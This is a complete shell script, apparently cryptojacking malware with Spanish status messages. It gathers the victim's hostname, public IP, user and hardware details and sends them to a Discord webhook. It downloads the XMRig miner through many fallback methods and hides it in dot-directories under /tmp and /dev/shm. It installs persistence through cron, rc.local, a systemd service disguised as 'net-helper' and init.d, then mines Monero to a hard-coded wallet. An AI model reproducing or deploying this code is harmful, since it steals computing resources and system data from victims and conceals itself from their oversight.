#!/bin/sh

W="45LqLiXactPdrh3yoHPhPkdZszwqTo3JxidWteGMiEkNE2ZgP3KzpUYgV2nWD8rt37SusiZ9DrpdZ7sDYDWm9d1cz"
P1="pool.xmr.wiki:3333"
P2="pool.supportxmr.com:3333"
H="discord.com"
HP="/api/webhooks/1457916143049113650/gipO4xBKVlQ6Be-SSWRQnDaLBI11StE852VC8gpocQFtKCreY_NCCTb6wqHtbOiubAUX"

N() {
M="$1"
J="{\"content\":\"$M\"}"
L=${#J}
if exec 3<>/dev/tcp/$H/80 2>/dev/null; then
printf "POST $HP HTTP/1.1\r\nHost: $H\r\nContent-Type: application/json\r\nContent-Length: $L\r\nConnection: close\r\n\r\n$J" >&3
exec 3<&-
fi
}

U() {
R="sys_$(hostname 2>/dev/null || echo unk)_$(date +%s)"
ip=$(host myip.opendns.com resolver1.opendns.com 2>/dev/null | grep "has address" | head -1 | awk '{print $4}' || echo "unk")
N "🚀 **SISTEMA ANALIZADO**\n🖥️ Host: $R\n🌐 IP: $ip\n👤 User: $(whoami)\n📦 Arch: $(uname -m)\n💾 RAM: $(grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)"MB"}' || echo "unk")"
}

D() {
url="$1"
out="$2"
N "⬇️ **DESCARGANDO** $url"
if command -v wget >/dev/null 2>&1; then
wget -q "$url" -O "$out" && N "✅ **WGET** Descarga exitosa" && return 0
fi
if command -v curl >/dev/null 2>&1; then
curl -s -L "$url" -o "$out" && N "✅ **CURL** Descarga exitosa" && return 0
fi
if command -v python3 >/dev/null 2>&1; then
python3 -c "import urllib.request; urllib.request.urlretrieve('$url', '$out')" 2>/dev/null && N "✅ **PYTHON3** Descarga exitosa" && return 0
fi
if command -v python >/dev/null 2>&1; then
python -c "import urllib.request; urllib.request.urlretrieve('$url', '$out')" 2>/dev/null && N "✅ **PYTHON** Descarga exitosa" && return 0
fi
if command -v perl >/dev/null 2>&1; then
perl -e "use LWP::Simple; getstore('$url', '$out');" 2>/dev/null && N "✅ **PERL** Descarga exitosa" && return 0
fi
if command -v nc >/dev/null 2>&1; then
host=$(echo "$url" | sed 's|^[^/]*//||; s|/.*$||')
path=$(echo "$url" | sed "s|^[^/]*//[^/]*||; s|^/||")
printf "GET /%s HTTP/1.1\r\nHost: %s\r\n\r\n" "$path" "$host" | nc "$host" 80 2>/dev/null | sed '1,/^\r$/d' > "$out" && [ -s "$out" ] && N "✅ **NC** Descarga exitosa" && return 0
fi
h=$(echo "$url" | sed 's|^[^/]*//||; s|/.*$||')
p=$(echo "$url" | sed "s|^[^/]*//[^/]*||; s|^/||")
if exec 3<>/dev/tcp/$h/80 2>/dev/null; then
printf "GET /%s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" "$p" "$h" >&3
while read -r l <&3; do case "$l" in $'\r'|"") break ;; esac; done
cat <&3 > "$out" 2>/dev/null
exec 3<&-
[ -f "$out" ] && [ -s "$out" ] && N "✅ **BASH** Descarga exitosa" && return 0
fi
N "❌ **ERROR** Todos los métodos de descarga fallaron"
return 1
}

G() {
for d in "/tmp/.X11-unix" "/tmp/.ICE-unix" "/var/tmp" "/dev/shm" "/var/lib/systemd" "/var/cache" "/run/user/$(id -u 2>/dev/null || echo 1000)" "/usr/local/tmp"; do
s="$d/.sd_$(date +%s)_$$"
if mkdir -p "$s" 2>/dev/null && [ -w "$s" ]; then echo "$s"; return 0; fi
done
echo "/tmp/.$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo $$)"
}

E() {
s="$1"
R="sys_$(hostname 2>/dev/null || echo unk)_$(date +%s)"
if command -v crontab >/dev/null 2>&1; then
t=$(mktemp 2>/dev/null || echo "/tmp/cr_$$")
crontab -l 2>/dev/null | grep -v "$s" > "$t" 2>/dev/null
echo "*/7 * * * * $s >/dev/null 2>&1" >> "$t"
echo "@reboot sleep 90 && $s >/dev/null 2>&1" >> "$t"
crontab "$t" 2>/dev/null
rm -f "$t"
N "✅ **CRONTAB** configurado\n⏰ Cada 7min + reboot"
fi
if [ -w /etc/rc.local ]; then
if ! grep -q "$s" /etc/rc.local 2>/dev/null; then
sed -i "/^exit 0/i\\[ -x \"$s\" ] && \"$s\" &" /etc/rc.local 2>/dev/null
N "✅ **RC.LOCAL** modificado"
fi
fi
if command -v systemctl >/dev/null 2>&1 && [ -w /etc/systemd/system ]; then
cat > /etc/systemd/system/net-helper.service 2>/dev/null << EOF
[Unit]
Description=Network Helper
After=network.target
[Service]
Type=simple
ExecStart=$s
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload >/dev/null 2>&1
systemctl enable net-helper.service >/dev/null 2>&1
systemctl start net-helper.service >/dev/null 2>&1
N "✅ **SYSTEMD** servicio creado"
fi
if [ -w /etc/init.d ]; then
cat > /etc/init.d/net-helper 2>/dev/null << EOF
#!/bin/sh
case "\$1" in start) $s & ;; stop) pkill -f "$s" 2>/dev/null ;; esac
exit 0
EOF
chmod +x /etc/init.d/net-helper 2>/dev/null
update-rc.d net-helper defaults >/dev/null 2>&1
/etc/init.d/net-helper start >/dev/null 2>&1
N "✅ **INIT.D** script instalado"
fi
}

X() {
case $(uname -m) in x86_64|amd64) echo "x64" ;; i*86) echo "x86" ;; aarch64|arm64) echo "aarch64" ;; arm*) echo "armhf" ;; *) echo "x64" ;; esac
}

Y() {
if [ -f /proc/cpuinfo ]; then c=$(grep -c "^processor" /proc/cpuinfo 2>/dev/null || echo 1); else c=1; fi
t=$((c / 2)); [ $t -lt 1 ] && t=1; [ $t -gt 4 ] && t=4; echo $t
}

Z() {
p="$1"; h=$(echo "$p" | cut -d: -f1); pt=$(echo "$p" | cut -d: -f2)
(exec 3<>/dev/tcp/$h/$pt) >/dev/null 2>&1 & pid=$!
for i in 1 2 3; do if kill -0 $pid 2>/dev/null; then sleep 1; else wait $pid; return $?; fi; done
kill $pid 2>/dev/null; return 1
}

I() {
d="$1"; a="$2"
url="https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-$a.tar.gz"
f="$d/pkg.tar.gz"
if D "$url" "$f"; then
tar -xzf "$f" -C "$d" --strip-components=1 2>/dev/null
rm -f "$f" 2>/dev/null
for b in "$d/xmrig" "$d/xmrig-6.25.0/xmrig"; do if [ -f "$b" ]; then chmod +x "$b" 2>/dev/null; echo "$b"; return 0; fi; done
fi
return 1
}

M() {
b="$1"; p="$2"; t="$3"; r="$4"
nohup "$b" -o "$p" -u "$W" --rig-id="$r" --pass="x" --donate-level=1 --threads=$t --cpu-max-threads-hint=50 --cpu-priority=0 --no-color --background --quiet >/dev/null 2>&1 &
sleep 2; if kill -0 $! 2>/dev/null; then echo $!; return 0; fi; return 1
}

main() {
if ps aux 2>/dev/null | grep -v grep | grep -q "xmrig.*$W"; then exit 0; fi
U
DI=$(G)
mkdir -p "$DI" 2>/dev/null
if [ ! -w "$DI" ]; then N "❌ **ERROR** No write access to $DI"; exit 0; fi
cd "$DI" || exit 0
N "📂 **DIRECTORIO** $DI"
A=$(X)
N "🔧 **ARQUITECTURA** $A"
BI="$DI/xmrig"
if [ ! -f "$BI" ] || [ ! -x "$BI" ]; then
BI=$(I "$DI" "$A")
if [ -z "$BI" ] || [ ! -x "$BI" ]; then N "❌ **ERROR** Download failed"; exit 0; fi
fi
E "$0"
T=$(Y)
N "⚙️ **CONFIG** Threads: $T"
PO="$P1"
if ! Z "$P1"; then PO="$P2"; if ! Z "$P2"; then N "❌ **ERROR** No pools reachable"; exit 0; fi; fi
N "🔗 **POOL** Conectado a $PO"
RID="m_$(hostname 2>/dev/null | cut -c1-3)_$(date +%H%M)"
PID=$(M "$BI" "$PO" "$T" "$RID")
if [ -n "$PID" ]; then
N "✅ **MINERO INICIADO**\n🆔 PID: $PID\n🧵 Threads: $T\n🏊 Pool: $PO\n📁 Dir: $(echo $DI | sed 's|/|/|g')"
(
while true; do sleep 300; if ! kill -0 $PID 2>/dev/null; then M "$BI" "$PO" "$T" "$RID" >/dev/null 2>&1; N "🔄 **REINICIO** Minero caído, restarting"; fi; done
) >/dev/null 2>&1 &
else N "❌ **ERROR** Failed to start miner"; fi
}

if [ "$1" = "debug" ]; then main; else main >/dev/null 2>&1 & fi